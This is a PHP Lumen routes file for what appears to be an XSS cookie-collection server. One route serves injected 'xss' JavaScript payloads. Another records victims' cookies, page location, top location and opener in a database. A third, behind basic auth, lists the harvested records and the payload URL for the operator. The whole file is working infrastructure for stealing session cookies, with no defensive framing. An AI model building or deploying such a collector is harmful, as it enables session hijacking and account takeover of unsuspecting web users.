<?php

/*
|--------------------------------------------------------------------------
| Application Routes
|--------------------------------------------------------------------------
|
| Here is where you can register all of the routes for an application.
| It is a breeze. Simply tell Lumen the URIs it should respond to
| and give it the Closure to call when that URI is requested.
|
 */

$app->get('/x{type}.js', ['as' => 'xss.js', function ($type) use ($app) {
    try {
        return view("xss{$type}", [
            'server' => env('HOST', $app->request->server('HTTP_HOST')),
            'id'     => str_random(8),
            'source' => $app->request->input('s', ''),
        ]);
    } catch (Exception $e) {
        return;
    }
}]);

$app->get('/x', function () use ($app) {
    $location    = $app->request->input('location', '');
    $topLocation = $app->request->input('toplocation', '');
    $opener      = $app->request->input('opener', '');
    $cookie      = $app->request->input('cookie', '');
    $source      = $app->request->input('s', '');

    if ($cookie && ($location || $topLocation || $opener)) {
        $app->db
            ->table('record')
            ->insert([
                'location'     => $location,
                'top_location' => $topLocation,
                'opener'       => $opener,
                'cookie'       => $cookie,
                'source'       => $source,
                'created_at'   => date('Y-m-d H:i:s'),
            ]);
    }

    return;
});

$app->get('/gate', ['middleware' => 'auth.basic', function () use ($app) {
    $perPage = 100;
    $source  = $app->request->input('source', '');
    $query   = $app->db->table('record')->orderBy('id', 'DESC');
    if ($source) {
        $query->where(compact('source'));
    }

    $records = $query->paginate($perPage);
    return view('gate', [
        'records' => $records,
        'jsUrl'   => route('xss.js', ['type' => 1])
    ]);
}]);
